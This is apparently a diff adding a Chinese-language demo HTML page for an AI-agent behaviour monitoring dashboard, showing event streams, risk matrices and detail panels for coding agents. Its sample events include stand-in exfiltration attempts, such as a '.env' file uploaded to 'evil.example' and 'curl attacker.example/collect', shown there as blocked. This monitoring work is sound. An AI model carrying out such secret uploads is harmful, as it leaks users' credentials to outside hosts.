@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>AIDR - 行为事件中心 Demo V2</title>
+  <style>
+    :root {
+      font-family: "Segoe UI", "Microsoft YaHei", Arial, sans-serif;
+      color: #182536;
+      background: #f2f4f7;
+      font-size: 14px;
+      letter-spacing: 0;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; min-width: 320px; background: #f2f4f7; }
+    button, select, input { font: inherit; }
+    button { border: 1px solid #cbd5df; background: #fff; color: #263647; border-radius: 5px; padding: 7px 10px; cursor: pointer; font-size: 12px; }
+    button:hover { background: #f5f8fa; }
+    select, input { border: 1px solid #cbd5df; border-radius: 5px; background: #fff; color: #263647; padding: 7px 9px; font-size: 12px; }
+    .app { display: grid; grid-template-columns: 224px minmax(0, 1fr); min-height: 100vh; }
+    .sidebar { background: #171c24; color: #d8dee8; padding: 18px 12px; }
+    .brand { display: none; }
+    .brand h1 { color: #fff; margin: 0; font-size: 20px; }
+    .brand p { color: #8fd5c4; margin: 5px 0 0; font-size: 12px; }
+    nav { display: grid; gap: 4px; padding-top: 0; }
+    .nav-btn { color: #adb7c6; border: 0; background: transparent; text-align: left; padding: 10px 12px; border-radius: 6px; font-size: 13px; }
+    .nav-btn:hover, .nav-btn.active { color: #fff; background: #29313d; }
+    .main { min-width: 0; }
+    .topbar { height: 56px; padding: 0 24px; background: #fff; border-bottom: 1px solid #dfe5ea; display: flex; align-items: center; justify-content: space-between; }
+    .topbar h2 { margin: 0; font-size: 16px; }
+    .live { color: #167769; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
+    .live i { display: inline-block; width: 7px; height: 7px; border-radius: 50%; background: #2fa184; }
+    .content { max-width: 1500px; margin: 0 auto; padding: 18px 24px 40px; }
+    .scope { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; margin-bottom: 14px; }
+    .scope .label { color: #687587; font-size: 11px; margin-right: 2px; }
+    .scope .status { margin-left: auto; color: #687587; font-size: 11px; }
+    .stats { display: grid; grid-template-columns: repeat(6, minmax(0, 1fr)); gap: 10px; margin-bottom: 14px; }
+    .stat, .panel { background: #fff; border: 1px solid #dfe5ea; border-radius: 7px; }
+    .stat { padding: 11px 13px; }
+    .stat span { display: block; color: #687587; font-size: 10px; }
+    .stat b { display: block; margin-top: 4px; font-size: 20px; }
+    .stat small { display: block; color: #85909c; font-size: 10px; margin-top: 2px; }
+    .stat.good b { color: #237a66; }
+    .stat.warn b { color: #a35b00; }
+    .stat.bad b { color: #b42318; }
+    .page-note { background: #eef7f5; border: 1px solid #bfe3da; border-radius: 6px; color: #286d61; padding: 9px 12px; font-size: 11px; line-height: 1.5; margin-bottom: 14px; }
+    .section-head { display: flex; justify-content: space-between; align-items: center; gap: 12px; padding: 12px 14px; border-bottom: 1px solid #e7ebee; }
+    .section-head h3 { margin: 0; font-size: 13px; }
+    .section-head p { margin: 3px 0 0; color: #7a8693; font-size: 10px; }
+    .section-head .right { display: flex; align-items: center; gap: 7px; flex-wrap: wrap; }
+    .matrix-panel { margin-bottom: 14px; }
+    .matrix-wrap { overflow-x: auto; padding: 10px 14px 13px; }
+    .matrix { min-width: 760px; display: grid; grid-template-columns: 174px repeat(8, minmax(62px, 1fr)) 118px; border-top: 1px solid #e7ebee; border-left: 1px solid #e7ebee; }
+    .matrix > div { min-height: 36px; padding: 7px 8px; border-right: 1px solid #e7ebee; border-bottom: 1px solid #e7ebee; font-size: 10px; }
+    .matrix .th { color: #687587; background: #f7f9fa; font-weight: 600; text-align: center; }
+    .matrix .agent { display: flex; align-items: center; gap: 7px; font-size: 11px; font-weight: 600; cursor: pointer; }
+    .matrix .agent:hover { background: #f2faf8; }
+    .agent-mark { width: 8px; height: 8px; border-radius: 50%; background: #2d8d79; flex: 0 0 auto; }
+    .agent-mark.blue { background: #3677a8; }
+    .agent-mark.orange { background: #bf720d; }
+    .agent-mark.red { background: #b42318; }
+    .cell { text-align: center; color: #718091; cursor: pointer; background: #fff; }
+    .cell:hover { outline: 2px solid #2a9180; outline-offset: -2px; }
+    .cell.low { background: #e7f4ef; color: #237a66; }
+    .cell.mid { background: #fff0d1; color: #915b07; }
+    .cell.high { background: #fbe1df; color: #b42318; font-weight: 700; }
+    .cell b { display: block; font-size: 12px; }
+    .matrix .summary { font-size: 10px; color: #687587; }
+    .matrix .summary strong { color: #182536; font-size: 12px; }
+    .overview-grid { display: grid; grid-template-columns: minmax(0, 1.55fr) minmax(320px, .8fr); gap: 14px; align-items: start; }
+    .timeline-panel, .pattern-panel { min-width: 0; }
+    .timeline { max-height: 500px; overflow: auto; padding: 7px 10px 10px; }
+    .event-row { display: grid; grid-template-columns: 66px 126px 94px minmax(200px, 1fr) 90px 72px; gap: 9px; align-items: center; min-height: 54px; padding: 8px; border-bottom: 1px solid #edf0f2; border-left: 3px solid transparent; cursor: pointer; }
+    .event-row:hover, .event-row.selected { background: #f2faf8; }
+    .event-row.selected { border-left-color: #167769; }
+    .event-row.block { border-left-color: #b42318; }
+    .event-row.alert { border-left-color: #bf720d; }
+    .event-row .time { color: #778493; font-size: 10px; }
+    .event-row .agent { font-weight: 600; font-size: 11px; }
+    .event-row .session { color: #6c7886; font-size: 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .event-row .behavior { font-size: 11px; line-height: 1.35; min-width: 0; }
+    .event-row .behavior b { display: block; font-weight: 600; }
+    .event-row .behavior small { color: #788593; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .event-row .source { color: #687587; font-size: 10px; }
+    .event-row .verdict { text-align: right; }
+    .tag { display: inline-flex; align-items: center; border-radius: 4px; padding: 3px 6px; font-size: 10px; font-weight: 700; white-space: nowrap; }
+    .tag.allow { color: #237a66; background: #e6f4ef; }
+    .tag.alert { color: #8b5400; background: #fff2d8; }
+    .tag.block { color: #b42318; background: #fdebea; }
+    .tag.blue { color: #2b5f8b; background: #e7f0f8; }
+    .timeline-footer { color: #7a8693; font-size: 10px; padding: 9px 12px; border-top: 1px solid #e7ebee; }
+    .pattern-list { padding: 10px 13px 12px; }
+    .pattern { padding: 10px 0; border-bottom: 1px solid #edf0f2; }
+    .pattern:last-child { border-bottom: 0; }
+    .pattern-top { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+    .pattern-top b { font-size: 11px; }
+    .pattern-top span { color: #687587; font-size: 10px; }
+    .pattern-flow { display: flex; flex-wrap: wrap; align-items: center; gap: 4px; margin-top: 7px; }
+    .pattern-flow i { color: #86919d; font-style: normal; font-size: 11px; }
+    .flow-node { border: 1px solid #d5dde4; border-radius: 4px; background: #f8fafb; color: #4c5b69; padding: 4px 6px; font-size: 10px; }
+    .pattern-meta { color: #788593; font-size: 10px; margin-top: 7px; line-height: 1.45; }
+    .bar-list { padding: 2px 13px 14px; }
+    .bar-item { margin-top: 10px; }
+    .bar-label { display: flex; justify-content: space-between; color: #596878; font-size: 10px; margin-bottom: 4px; }
+    .bar { height: 6px; background: #edf0f2; border-radius: 3px; overflow: hidden; }
+    .bar i { display: block; height: 100%; border-radius: 3px; background: #2b9079; }
+    .bar i.orange { background: #bf720d; }
+    .bar i.red { background: #b42318; }
+    .detail-panel { margin-top: 14px; }
+    .detail-grid { display: grid; grid-template-columns: minmax(0, 1.1fr) minmax(260px, .9fr); gap: 14px; padding: 13px 14px 15px; }
+    .detail-title { font-size: 15px; font-weight: 700; margin-bottom: 4px; }
+    .detail-subtitle { color: #687587; font-size: 11px; line-height: 1.5; }
+    .detail-fields { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 8px; margin-top: 12px; }
+    .source-health { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; margin-bottom: 14px; }
+    .health-card { background: #fff; border: 1px solid #dfe5ea; border-radius: 7px; padding: 9px 11px; }
+    .health-card span { display: block; color: #687587; font-size: 10px; }
+    .health-card b { display: block; color: #237a66; font-size: 12px; margin-top: 3px; }
+    .health-card small { display: block; color: #85909c; font-size: 10px; margin-top: 2px; }
+    .topbar-actions { display: flex; align-items: center; gap: 10px; }
+    .field { border: 1px solid #e0e6ea; border-radius: 5px; padding: 8px; min-width: 0; }
+    .field span { display: block; color: #7c8793; font-size: 9px; }
+    .field b { display: block; margin-top: 3px; font-size: 11px; overflow-wrap: anywhere; }
+    .nearby { border-left: 1px solid #e7ebee; padding-left: 14px; }
+    .nearby h4 { margin: 0 0 8px; font-size: 12px; }
+    .nearby-item { display: grid; grid-template-columns: 48px 1fr 56px; gap: 6px; align-items: center; padding: 7px 0; border-bottom: 1px solid #edf0f2; font-size: 10px; }
+    .nearby-item:last-child { border-bottom: 0; }
+    .nearby-item .time { color: #7c8793; }
+    .nearby-item .text { min-width: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .detail-actions { display: flex; flex-wrap: wrap; gap: 7px; margin-top: 13px; }
+    .primary { color: #fff; border-color: #167769; background: #167769; }
+    .primary:hover { background: #12685d; }
+    .toast { position: fixed; right: 22px; bottom: 20px; display: none; max-width: 360px; padding: 10px 13px; border-radius: 6px; color: #fff; background: #263647; box-shadow: 0 5px 20px rgba(25, 37, 50, .2); font-size: 12px; z-index: 10; }
+    .toast.show { display: block; }
+    @media (max-width: 1120px) {
+      .stats { grid-template-columns: repeat(3, 1fr); }
+      .overview-grid { grid-template-columns: 1fr; }
+      .detail-grid { grid-template-columns: 1fr; }
+      .nearby { border-left: 0; border-top: 1px solid #e7ebee; padding: 13px 0 0; }
+    }
+    @media (max-width: 760px) {
+      .app { grid-template-columns: 74px minmax(0, 1fr); }
+      .brand h1 { font-size: 15px; }
+      .brand p, .nav-btn span { display: none; }
+      .nav-btn { font-size: 0; text-align: center; }
+      .nav-btn::first-letter { font-size: 14px; }
+      .content { padding: 14px 12px 28px; }
+      .topbar { padding: 0 14px; }
+      .scope .status { width: 100%; margin-left: 0; }
+      .stats { grid-template-columns: repeat(2, 1fr); }
+      .event-row { grid-template-columns: 54px 100px minmax(150px, 1fr) 65px; }
+      .event-row .session, .event-row .source { display: none; }
+      .detail-fields { grid-template-columns: 1fr 1fr; }
+      .source-health { grid-template-columns: 1fr 1fr; }
+    }
+    @media (max-width: 430px) {
+      .stats { grid-template-columns: 1fr 1fr; gap: 7px; }
+      .stat { padding: 9px; }
+      .event-row { grid-template-columns: 48px minmax(0, 1fr) 60px; gap: 6px; }
+      .event-row .agent { display: none; }
+      .event-row .behavior small { white-space: normal; }
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar">
+      
+      <nav>
+        <button class="nav-btn">概览</button>
+        <button class="nav-btn">AI Agent 会话</button>
+        <button class="nav-btn">AI Agent 发现</button>
+        <button class="nav-btn">策略中心</button>
+        <button class="nav-btn active">行为监控</button>
+        <button class="nav-btn">语义模型</button>
+        <button class="nav-btn">系统</button>
+      </nav>
+    </aside>
+    <main class="main">
+      <header class="topbar"><h2>行为监控</h2><div class="topbar-actions"><div class="live"><i></i> <span id="streamState">Event stream connected</span></div><button id="streamButton" onclick="toggleStream()">暂停实时流</button></div></header>
+      <div class="content">
+        <div class="scope">
+          <span class="label">范围</span>
+          <select id="agentFilter" onchange="applyFilters()"><option value="all">全部 Agent</option><option value="codex">OpenAI Codex</option><option value="opencode">OpenCode</option><option value="hermes">Hermes</option><option value="new-agent">new-agent-demo</option></select>
+          <select id="typeFilter" onchange="applyFilters()"><option value="all">全部行为类型</option><option value="process">进程</option><option value="tool">工具 / MCP</option><option value="file">文件</option><option value="network">网络</option><option value="drift">行为偏移</option><option value="enforcement">强制执行</option></select>
+          <select id="verdictFilter" onchange="applyFilters()"><option value="all">全部判决</option><option value="allow">放行</option><option value="alert">告警</option><option value="block">阻断</option></select>
+          <select id="timeFilter"><option>最近 24 小时</option><option>最近 7 天</option><option>自定义时间</option></select>
+          <input id="searchInput" type="search" placeholder="搜索 Agent、对象或行为" oninput="applyFilters()">
+          <button onclick="resetFilters()">重置</button>
+          <span class="status">覆盖 4 个 Agent · 24 个活跃会话 · 最后接收 <b id="lastIngest">刚刚</b></span>
+        </div>
+
+        <div class="stats">
+          <div class="stat"><span>监控 Agent</span><b>4</b><small>全部在线</small></div>
+          <div class="stat"><span>行为事件</span><b>189</b><small>过去 24 小时</small></div>
+          <div class="stat good"><span>正常行为</span><b>162</b><small>85.7%</small></div>
+          <div class="stat warn"><span>偏移 / 告警</span><b>9</b><small>涉及 3 个 Agent</small></div>
+          <div class="stat bad"><span>强制阻断</span><b>18</b><small>涉及 6 个会话</small></div>
+          <div class="stat warn"><span>当前偏移度</span><b>12</b><small>阈值 20 / 70</small></div>
+        </div>
+<div class="source-health">
+          <div class="health-card"><span>Endpoint sensor</span><b>正常 · 连接中</b><small>eBPF / process / file / network</small></div>
+          <div class="health-card"><span>Adapter SDK</span><b>正常 · 4 个适配器</b><small>Codex · OpenCode · Hermes · 标准接口</small></div>
+          <div class="health-card"><span>Event correlation</span><b>正常 · 189 条事件</b><small>去重 0 · 乱序修正 2</small></div>
+          <div class="health-card"><span>Policy enforcement</span><b>正常 · 18 次阻断</b><small>实时策略版本 2.2.5</small></div>
+        </div>
+
+<section class="panel matrix-panel">
+          <div class="section-head"><div><h3>Agent 行为态势</h3><p>按时间桶聚合事件数量和风险等级，定位哪个 Agent 在什么时间发生了异常活动</p></div><div class="right"><span class="tag allow">低风险</span><span class="tag alert">需关注</span><span class="tag block">高风险</span></div></div>
+          <div class="matrix-wrap">
+            <div class="matrix" id="agentMatrix">
+              <div class="th">Agent / 时间</div><div class="th">08:00</div><div class="th">09:00</div><div class="th">10:00</div><div class="th">11:00</div><div class="th">12:00</div><div class="th">13:00</div><div class="th">14:00</div><div class="th">15:00</div><div class="th">24h 汇总</div>
+              <div class="agent" data-agent="codex" onclick="filterAgent('codex')"><i class="agent-mark red"></i>OpenAI Codex</div><div class="cell low" data-agent="codex"><b>12</b>正常</div><div class="cell low" data-agent="codex"><b>18</b>正常</div><div class="cell mid" data-agent="codex"><b>21</b>1 告警</div><div class="cell low" data-agent="codex"><b>14</b>正常</div><div class="cell high" data-agent="codex"><b>19</b>2 阻断</div><div class="cell mid" data-agent="codex"><b>17</b>偏移</div><div class="cell low" data-agent="codex"><b>11</b>正常</div><div class="cell low" data-agent="codex"><b>9</b>正常</div><div class="summary" data-agent="codex"><strong>121</strong>  · 3 风险</div>
+              <div class="agent" data-agent="opencode" onclick="filterAgent('opencode')"><i class="agent-mark blue"></i>OpenCode</div><div class="cell low" data-agent="opencode"><b>6</b>正常</div><div class="cell low" data-agent="opencode"><b>8</b>正常</div><div class="cell low" data-agent="opencode"><b>13</b>正常</div><div class="cell mid" data-agent="opencode"><b>15</b>工具扩展</div><div class="cell mid" data-agent="opencode"><b>10</b>1 告警</div><div class="cell low" data-agent="opencode"><b>7</b>正常</div><div class="cell low" data-agent="opencode"><b>5</b>正常</div><div class="cell low" data-agent="opencode"><b>3</b>正常</div><div class="summary" data-agent="opencode"><strong>67</strong>  · 2 风险</div>
+              <div class="agent" data-agent="hermes" onclick="filterAgent('hermes')"><i class="agent-mark orange"></i>Hermes</div><div class="cell low" data-agent="hermes"><b>4</b>正常</div><div class="cell low" data-agent="hermes"><b>3</b>正常</div><div class="cell low" data-agent="hermes"><b>5</b>正常</div><div class="cell low" data-agent="hermes"><b>4</b>正常</div><div class="cell alert" data-agent="hermes"><b>6</b>网络告警</div><div class="cell low" data-agent="hermes"><b>2</b>正常</div><div class="cell low" data-agent="hermes"><b>3</b>正常</div><div class="cell low" data-agent="hermes"><b>2</b>正常</div><div class="summary" data-agent="hermes"><strong>29</strong>  · 1 风险</div>
+              <div class="agent" data-agent="new-agent" onclick="filterAgent('new-agent')"><i class="agent-mark"></i>new-agent-demo</div><div class="cell low" data-agent="new-agent"><b>0</b>无活动</div><div class="cell low" data-agent="new-agent"><b>1</b>正常</div><div class="cell low" data-agent="new-agent"><b>0</b>无活动</div><div class="cell low" data-agent="new-agent"><b>0</b>无活动</div><div class="cell low" data-agent="new-agent"><b>1</b>正常</div><div class="cell low" data-agent="new-agent"><b>0</b>无活动</div><div class="cell low" data-agent="new-agent"><b>0</b>无活动</div><div class="cell low" data-agent="new-agent"><b>0</b>无活动</div><div class="summary" data-agent="new-agent"><strong>2</strong>  · 无风险</div>
+            </div>
+          </div>
+        </section>
+
+        <div class="overview-grid">
+          <section class="panel timeline-panel">
+            <div class="section-head"><div><h3>跨 Agent 行为事件流</h3><p>按发生时间展示系统观测到的行为，不把同一事件包装成重复的会话卡片</p></div><div class="right"><span id="eventCount" class="muted" style="font-size:10px">展示 9 / 9</span><button onclick="injectEvent()">注入测试事件</button></div></div>
+            <div class="timeline" id="eventStream">
+              <div class="event-row block" data-agent="codex" data-type="network" data-verdict="block" data-search="OpenAI Codex codex-7f3a .env evil.example 密钥外传" onclick="selectEvent(this, '密钥外传尝试', 'OpenAI Codex', 'codex-7f3a', '网络请求', 'BLOCK')"><span class="time">12:23:47</span><span class="agent">OpenAI Codex</span><span class="session">codex-7f3a</span><span class="behavior"><b>敏感数据外传尝试</b><small>.env → evil.example/upload · 外部网络被阻断</small></span><span class="source">semantic + rules</span><span class="verdict"><span class="tag block">BLOCK</span></span></div>
+              <div class="event-row alert" data-agent="opencode" data-type="tool" data-verdict="alert" data-search="OpenCode opencode-22bd tools list write_file 工具扩展" onclick="selectEvent(this, '工具能力扩展', 'OpenCode', 'opencode-22bd', 'MCP tools/list', 'ALERT')"><span class="time">12:23:35</span><span class="agent">OpenCode</span><span class="session">opencode-22bd</span><span class="behavior"><b>MCP 工具目录发生变化</b><small>发现 write_file · 未出现在当前任务候选能力集合</small></span><span class="source">local rules</span><span class="verdict"><span class="tag alert">ALERT</span></span></div>
+              <div class="event-row allow" data-agent="codex" data-type="file" data-verdict="allow" data-search="OpenAI Codex codex-7f3a ReadFile server.js 文件读取" onclick="selectEvent(this, '授权文件读取', 'OpenAI Codex', 'codex-7f3a', 'server.js', 'ALLOW')"><span class="time">12:23:12</span><span class="agent">OpenAI Codex</span><span class="session">codex-7f3a</span><span class="behavior"><b>读取工作区文件</b><small>ReadFile server.js · 命中 workspace allowlist</small></span><span class="source">policy</span><span class="verdict"><span class="tag allow">ALLOW</span></span></div>
+              <div class="event-row alert" data-agent="codex" data-type="drift" data-verdict="alert" data-search="OpenAI Codex codex-93ac behavior drift fileRead shell network 能力偏移" onclick="selectEvent(this, '能力范围偏移', 'OpenAI Codex', 'codex-93ac', 'fileRead → shell + network', 'ALERT')"><span class="time">12:22:58</span><span class="agent">OpenAI Codex</span><span class="session">codex-93ac</span><span class="behavior"><b>行为偏移：能力范围扩大</b><small>fileRead → shell + network · 偏移评分 25 / 100</small></span><span class="source">baseline model</span><span class="verdict"><span class="tag alert">ALERT</span></span></div>
+              <div class="event-row allow" data-agent="hermes" data-type="network" data-verdict="allow" data-search="Hermes hermes-a019 api.openai.com 网络请求" onclick="selectEvent(this, '已授权网络访问', 'Hermes', 'hermes-a019', 'api.openai.com', 'ALLOW')"><span class="time">12:22:41</span><span class="agent">Hermes</span><span class="session">hermes-a019</span><span class="behavior"><b>访问已授权服务</b><small>api.openai.com · 域名和目的与基线一致</small></span><span class="source">policy</span><span class="verdict"><span class="tag allow">ALLOW</span></span></div>
+              <div class="event-row allow" data-agent="opencode" data-type="process" data-verdict="allow" data-search="OpenCode opencode-22bd process npm test 进程" onclick="selectEvent(this, '进程执行', 'OpenCode', 'opencode-22bd', 'npm test', 'ALLOW')"><span class="time">12:22:30</span><span class="agent">OpenCode</span><span class="session">opencode-22bd</span><span class="behavior"><b>执行测试进程</b><small>npm test · 工作区内命令且无外部副作用</small></span><span class="source">ebpf sensor</span><span class="verdict"><span class="tag allow">ALLOW</span></span></div>
+              <div class="event-row block" data-agent="codex" data-type="enforcement" data-verdict="block" data-search="OpenAI Codex codex-55bf curl attacker.example 强制执行" onclick="selectEvent(this, '外部上传强制阻断', 'OpenAI Codex', 'codex-55bf', 'curl attacker.example', 'BLOCK')"><span class="time">12:21:56</span><span class="agent">OpenAI Codex</span><span class="session">codex-55bf</span><span class="behavior"><b>外部上传被强制阻断</b><small>curl attacker.example/collect · network=false</small></span><span class="source">endpoint policy</span><span class="verdict"><span class="tag block">BLOCK</span></span></div>
+              <div class="event-row alert" data-agent="hermes" data-type="drift" data-verdict="alert" data-search="Hermes hermes-8c11 baseline drift network 网络偏移" onclick="selectEvent(this, '网络行为偏移', 'Hermes', 'hermes-8c11', 'new external domain', 'ALERT')"><span class="time">12:21:22</span><span class="agent">Hermes</span><span class="session">hermes-8c11</span><span class="behavior"><b>新增外部域名行为</b><small>域名不在过去 7 天行为基线中 · 等待复核</small></span><span class="source">baseline model</span><span class="verdict"><span class="tag alert">ALERT</span></span></div>
+              <div class="event-row allow" data-agent="new-agent" data-type="process" data-verdict="allow" data-search="new-agent-demo new-agent-01 process startup 进程启动" onclick="selectEvent(this, 'Agent 进程启动', 'new-agent-demo', 'new-agent-01', 'agent runtime', 'ALLOW')"><span class="time">12:20:11</span><span class="agent">new-agent-demo</span><span class="session">new-agent-01</span><span class="behavior"><b>发现并启动 Agent 进程</b><small>Adapter SDK 标准事件 · 已进入监控范围</small></span><span class="source">adapter sdk</span><span class="verdict"><span class="tag allow">ALLOW</span></span></div>
+            </div>
+            <div class="timeline-footer">行为事件来自 Endpoint sensor、Adapter SDK、规则引擎和基线模型；点击事件查看局部证据并跳转对应会话。</div>
+          </section>
+
+          <aside>
+            <section class="panel pattern-panel">
+              <div class="section-head"><div><h3>行为模式聚合</h3><p>从事件流中归并重复行为路径</p></div><span class="tag blue">过去 24h</span></div>
+              <div class="pattern-list">
+                <div class="pattern"><div class="pattern-top"><b>工作区读取与测试</b><span>86 次 · 4 Agent</span></div><div class="pattern-flow"><span class="flow-node">Process</span><i>→</i><span class="flow-node">ReadFile</span><i>→</i><span class="flow-node">Test</span></div><div class="pattern-meta">正常基线行为，主要发生在开发任务启动阶段</div></div>
+                <div class="pattern"><div class="pattern-top"><b>能力扩展路径</b><span>9 次 · 3 Agent</span></div><div class="pattern-flow"><span class="flow-node">ReadFile</span><i>→</i><span class="flow-node">Shell</span><i>→</i><span class="flow-node">Network</span></div><div class="pattern-meta">较基线新增 shell 或 network，进入偏移检查</div></div>
+                <div class="pattern"><div class="pattern-top"><b>敏感数据外传链</b><span>6 次 · 2 Agent</span></div><div class="pattern-flow"><span class="flow-node">Secret file</span><i>→</i><span class="flow-node">Encode</span><i>→</i><span class="flow-node">Upload</span></div><div class="pattern-meta"><span class="bad">全部被阻断</span>，关联 6 个高风险会话</div></div>
+                <div class="pattern"><div class="pattern-top"><b>MCP 工具目录变化</b><span>4 次 · 2 Agent</span></div><div class="pattern-flow"><span class="flow-node">tools/list</span><i>→</i><span class="flow-node">New tool</span><i>→</i><span class="flow-node">Review</span></div><div class="pattern-meta">发现未在任务意图中声明的新能力，需要审批</div></div>
+              </div>
+            </section>
+            <section class="panel" style="margin-top:14px">
+              <div class="section-head"><div><h3>行为类型分布</h3><p>按系统事件类型汇总</p></div></div>
+              <div class="bar-list">
+                <div class="bar-item"><div class="bar-label"><span>文件 / 工作区</span><b>86</b></div><div class="bar"><i style="width:76%"></i></div></div>
+                <div class="bar-item"><div class="bar-label"><span>进程 / Shell</span><b>42</b></div><div class="bar"><i style="width:46%"></i></div></div>
+                <div class="bar-item"><div class="bar-label"><span>工具 / MCP</span><b>31</b></div><div class="bar"><i class="orange" style="width:34%"></i></div></div>
+                <div class="bar-item"><div class="bar-label"><span>网络 / 外联</span><b>21</b></div><div class="bar"><i class="orange" style="width:23%"></i></div></div>
+                <div class="bar-item"><div class="bar-label"><span>阻断与偏移</span><b>9</b></div><div class="bar"><i class="red" style="width:10%"></i></div></div>
+              </div>
+            </section>
+          </aside>
+        </div>
+
+        <section class="panel detail-panel">
+          <div class="section-head"><div><h3>选中事件与局部行为上下文</h3><p>只显示当前事件前后相邻的系统行为，完整 Prompt 和会话 Decision Trace 在会话页查看</p></div><span id="detailVerdict" class="tag block">BLOCK</span></div>
+          <div class="detail-grid">
+            <div>
+              <div id="detailTitle" class="detail-title">密钥外传尝试</div>
+              <div id="detailSubtitle" class="detail-subtitle">OpenAI Codex · Session codex-7f3a · 12:23:47 · 网络请求</div>
+              <div class="detail-fields"><div class="field"><span>观测来源</span><b id="detailSource">Endpoint eBPF + semantic model</b></div><div class="field"><span>对象</span><b id="detailObject">.env → evil.example/upload</b></div><div class="field"><span>偏移评分</span><b id="detailScore" class="bad">84 / 100</b></div><div class="field"><span>事件关联</span><b id="detailIncident">INC-2026-0714-003</b></div><div class="field"><span>处置状态</span><b id="detailCaseState" class="bad">已阻断</b></div></div>
+              <div class="detail-actions"><button class="primary" onclick="openSession()">查看对应会话</button><button onclick="copyEvidence()">复制事件证据</button><button onclick="showToast('已创建人工复核任务')">提交人工复核</button></div>
+            </div>
+            <div class="nearby"><h4>相邻事件</h4><div id="nearbyEvents"><div class="nearby-item"><span class="time">12:23:12</span><span class="text">ReadFile server.js · 命中工作区边界</span><span class="tag allow">ALLOW</span></div><div class="nearby-item"><span class="time">12:23:28</span><span class="text">读取 .env · sensitive file 规则命中</span><span class="tag alert">ALERT</span></div><div class="nearby-item"><span class="time">12:23:47</span><span class="text">外部上传请求 · network=false</span><span class="tag block">BLOCK</span></div><div class="nearby-item"><span class="time">12:23:48</span><span class="text">Agent 响应返回 · 进程保持监控</span><span class="tag allow">ALLOW</span></div></div></div>
+          </div>
+        </section>
+      </div>
+    </main>
+  </div>
+  <div id="toast" class="toast"></div>
+  <script>
+    const stream = document.getElementById('eventStream');
+    const eventRows = () => [...stream.querySelectorAll('.event-row')];
+    let selectedRow = eventRows()[0];
+    let streamRunning = true;
+
+    function toggleStream() {
+      streamRunning = !streamRunning;
+      document.getElementById("streamState").textContent = streamRunning ? "Event stream connected" : "Event stream paused";
+      document.getElementById("streamButton").textContent = streamRunning ? "暂停实时流" : "恢复实时流";
+      showToast(streamRunning ? "实时事件流已恢复" : "实时事件流已暂停");
+    }
+
+    setInterval(() => {
+      if (streamRunning) document.getElementById("lastIngest").textContent = "刚刚";
+    }, 5000);
+
+    function applyFilters() {
+      const agent = document.getElementById('agentFilter').value;
+      const type = document.getElementById('typeFilter').value;
+      const verdict = document.getElementById('verdictFilter').value;
+      const query = document.getElementById('searchInput').value.trim().toLowerCase();
+      let visible = 0;
+      eventRows().forEach(row => {
+        const matches = (agent === 'all' || row.dataset.agent === agent) &&
+          (type === 'all' || row.dataset.type === type) &&
+          (verdict === 'all' || row.dataset.verdict === verdict) &&
+          (!query || row.dataset.search.toLowerCase().includes(query));
+        row.style.display = matches ? 'grid' : 'none';
+        if (matches) visible++;
+      });
+      document.getElementById('eventCount').textContent = `展示 ${visible} / ${eventRows().length}`;
+    }
+
+    function filterAgent(agent) {
+      document.getElementById('agentFilter').value = agent;
+      applyFilters();
+      document.getElementById('eventStream').scrollIntoView({ behavior: 'smooth', block: 'start' });
+      showToast(`已聚焦 ${agent === 'codex' ? 'OpenAI Codex' : agent === 'opencode' ? 'OpenCode' : agent === 'hermes' ? 'Hermes' : 'new-agent-demo'} 的行为事件`);
+    }
+
+    function resetFilters() {
+      document.getElementById('agentFilter').value = 'all';
+      document.getElementById('typeFilter').value = 'all';
+      document.getElementById('verdictFilter').value = 'all';
+      document.getElementById('searchInput').value = '';
+      applyFilters();
+    }
+
+    function selectEvent(row, title, agent, session, object, verdict) {
+      eventRows().forEach(item => item.classList.remove('selected'));
+      row.classList.add('selected');
+      selectedRow = row;
+      document.getElementById('detailTitle').textContent = title;
+      document.getElementById('detailSubtitle').textContent = `${agent} · Session ${session} · ${row.querySelector('.time').textContent} · ${row.querySelector('.behavior b').textContent}`;
+      document.getElementById('detailObject').textContent = object;
+      document.getElementById('detailVerdict').className = `tag ${verdict === 'BLOCK' ? 'block' : verdict === 'ALERT' ? 'alert' : 'allow'}`;
+      document.getElementById('detailVerdict').textContent = verdict;
+      document.getElementById('detailScore').textContent = verdict === 'BLOCK' ? '84 / 100' : verdict === 'ALERT' ? '38 / 100' : '6 / 100';
+      document.getElementById('detailScore').className = verdict === 'BLOCK' ? 'bad' : verdict === 'ALERT' ? 'warn' : 'good';
+      document.getElementById('detailIncident').textContent = verdict === 'BLOCK' ? 'INC-2026-0714-003' : verdict === 'ALERT' ? 'INC-2026-0714-006' : 'EVT-2026-0714-118';
+      document.getElementById('detailCaseState').textContent = verdict === 'BLOCK' ? '已阻断' : verdict === 'ALERT' ? '待复核' : '已放行';
+      document.getElementById('detailCaseState').className = verdict === 'BLOCK' ? 'bad' : verdict === 'ALERT' ? 'warn' : 'good';
+      showToast(`已选中 ${agent} 的事件：${title}`);
+    }
+
+    function injectEvent() {
+      const row = document.createElement('div');
+      row.className = 'event-row alert';
+      row.dataset.agent = 'opencode';
+      row.dataset.type = 'drift';
+      row.dataset.verdict = 'alert';
+      row.dataset.search = 'OpenCode opencode-22bd new mcp capability behavior drift';
+      row.onclick = () => selectEvent(row, '新 MCP 能力待复核', 'OpenCode', 'opencode-22bd', 'mcp://filesystem.write', 'ALERT');
+      row.innerHTML = '<span class="time">12:24:02</span><span class="agent">OpenCode</span><span class="session">opencode-22bd</span><span class="behavior"><b>新 MCP 能力待复核</b><small>filesystem.write · 不在当前任务候选能力集合</small></span><span class="source">event bus</span><span class="verdict"><span class="tag alert">ALERT</span></span>';
+      stream.prepend(row);
+      applyFilters();
+      selectEvent(row, '新 MCP 能力待复核', 'OpenCode', 'opencode-22bd', 'mcp://filesystem.write', 'ALERT');
+    }
+
